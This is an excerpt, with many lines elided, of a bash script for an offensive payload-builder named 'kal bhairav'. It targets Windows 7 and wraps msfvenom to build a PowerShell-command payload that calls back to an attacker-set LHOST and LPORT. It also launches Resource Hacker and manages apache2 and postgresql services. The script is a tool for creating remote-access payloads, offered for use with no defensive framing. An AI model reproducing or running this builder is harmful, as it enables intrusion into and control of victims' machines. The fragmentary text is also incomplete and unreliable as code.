...
if [ "$FaIl" = "YES" ]; then
  sleep 3
  echo ${YellowF}[☆] kal bhairav needs to restart to finish installs ..${Reset};
  sleep 2
  exit
fi
...
if ! [ "$HkLm" = "Microsoft Windows 7" ]; then
  ...
  echo ${RedF}[x]${white} kal bhairav requires: ${GreenF}windows 7${white} version ..${Reset};
...
if [ "$PaLe" = "exe" ] && [ "$AuTo" = "YES" ]; then
  ...
  if [ "$?" -eq "0" ]; then
    ...
    echo ${white}    Maintener${RedF}::${white}unknone hart ${RedF}::${white}[Ferdi S Kennedy]${Reset};
    echo ""
...
if [ "$AuTo" = "YES" ]; then
  ...
  xterm -T " kal bhairav - build payload: .$PaLe " -geometry 110x23 -e "sudo msfvenom -p $paylo LHOST=$IP LPORT=$AhPu -f psh-cmd -o $IPATH/output/chars.raw" > /dev/null 2>&1
  cd $IPATH/output
...
!
    sleep 3
    xterm -T "kal bhairav" -geometry 90x26 -e "$arch $IPATH/bin/reshacker_setup.exe && sleep 3"
  ...
  sleep 2
    ...
    if [ "$NoMsF" = "YES" ]; then
      ...
      echo ""
      sleep 1
      echo ${YellowF}[☆] When finish, press any key to Exit kal bhairav ..${Reset};
      read op
    ...
    echo ""
    echo ${white}    Codename${RedF}::${white}$CnA ${Reset};
    echo ${white}    Author${RedF}::${white}unknone hart ${RedF}::${white}[Ferdi S Kennedy]${Reset};
    sleep 1
    service apache2 stop | zenity --progress --pulsate --title "PLEASE WAIT" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    if ! [ "$NoMsF" = "YES" ]; then
    service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
